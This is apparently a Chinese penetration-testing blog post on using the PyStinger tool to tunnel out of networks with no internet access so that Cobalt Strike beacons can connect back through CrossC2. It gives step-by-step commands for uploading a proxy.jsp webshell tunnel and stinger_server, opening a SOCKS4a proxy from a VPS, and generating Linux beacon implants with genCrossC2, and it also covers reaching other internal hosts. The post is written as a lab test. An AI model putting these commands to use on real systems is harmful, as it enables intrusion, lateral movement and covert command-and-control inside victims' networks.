PyStinger毒刺不出网上线CS

2022-04-21 3 min read

官方说明

https://github.com/FunnyWolf/pystinger/blob/master/readme_cn.md

操作说明

  • proxy.jsp上传到目标服务器,确保 http://example.com:8080/proxy.jsp 可以访问,页面返回 UTF-8

  • 将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行start D:/XXX/stinger_server.exe启动服务端

    不要直接运行D:/XXX/stinger_server.exe,会导致tcp断连

  • vps执行./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000

  • 此时已经在vps127.0.0.1:60000启动了一个example.com所在内网的socks4a代理

  • 此时已经将目标服务器的127.0.0.1:60020映射到vps的127.0.0.1:60020

坑点

  • tomcat-8.5 不行，隧道的webshell无法返回utf-8
  • tomcat-7.0.32可行。

配合CrossC2

经常遇到不出网的linux主机作为入口点，上次bank项目就是。这里就想模拟试一下，完成CS上线。其实这种情况

  • msf/viper或许更巴适。
  • 或者proxy之类软件，中转一下流量上线或许更好。

C2主机：10.211.55.7 Kali Linux

入口点：10.211.55.16 Ubuntu

内网其他主机：10.211.55.11 Windows 10

不出网linux入口点上线CS

  • 正常连接webshell，上传隧道文件以及stinger_server并执行。（用的tomcat7.0+jdk7）
  • C2主机上执行
    ./stinger_client -w http://10.211.55.16:8080/proxy.jsp -l 127.0.0.1 -p 60000
    效果就是127.0.0.1:60000启动了一个10.211.55.16所在内网的socks4a代理
    且vps上的60020，对应着内网60020。至此隧道建立完毕
  • cs生成linux上线木马
    ./genCrossC2.MacOS 127.0.0.1 60020 beacon_keys null Linux x64 cc2.out

内网其他主机上线

  • 唯一需要注意的是前面启stinger服务端的时候要加ip
    ./stinger_server 0.0.0.0
  • cobalt strike添加监听,端口选择RAT Config中的Handler/LISTEN中的端口(通常为60020),beacons为10.211.55.16(example.com的内网IP地址)

其实我的理解就是把上述的127.0.0.1 该成对应的内网ip，达成内网其他主机可以通讯的作用。

上线内网其他Linux主机：

./genCrossC2.MacOS 10.211.55.16 60020 beacon_keys null Linux x64 16.out

上线内网其他Windows主机：

由于CrossC2中必须用https监听，所以win7啥的上不了线。

弊端

说说弊端

  • pystinger在tomcat高版本不行，限制1
  • 配合CrossC2的https监听，win7等低版本windows不能上线，限制2

总体而言，这不是最优解吧，只能说一次尝试，对隧道的理解加深仅此而已吧。
